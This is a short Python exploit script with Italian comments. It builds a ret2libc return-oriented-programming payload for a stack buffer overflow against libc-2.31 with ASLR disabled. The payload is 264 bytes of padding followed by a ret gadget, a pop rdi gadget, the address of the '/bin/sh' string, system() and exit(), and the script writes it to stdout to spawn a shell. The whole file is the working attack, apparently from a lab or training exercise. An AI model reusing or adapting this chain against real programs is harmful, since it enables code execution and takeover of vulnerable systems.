import struct
import sys

#Questo exploit si basa su libc-2.31 e sfrutta il tool ropper per ricavare gli indirizzi dei gadget.
# Ha bisogno di ASLR disabilitato.

def main():
    libc_addr = 0x7ffff7dc8000 #indirizzo base di libc nel file eseguibile

    ret = libc_addr + 0xc1801 #offset
    pop_rdi = libc_addr + 0x23b6a #offset
    bin_sh = libc_addr + 0x1b45bd #offset

    system_addr = 0x7ffff7e1a290
    exit_addr = 0x7ffff7e0ea40

    payload = b"A" * 256
    payload += b"BBBBBBBB"
    payload += struct.pack("<Q", ret) #aggiunta un return per prevenire errori nello stack
    payload += struct.pack("<Q", pop_rdi) #aggiornamento del rip in modo che contenga pop rdi ret
    payload += struct.pack("<Q", bin_sh) #inserimento indirizzo della stringa /bin/sh come argomento di system()
    payload += struct.pack("<Q", system_addr) #jump all'indirizzo della funzione system()
    payload += struct.pack("<Q", exit_addr) #chiamata della funzione exit()

    sys.stdout.buffer.write(payload)

if __name__ == '__main__':
    main()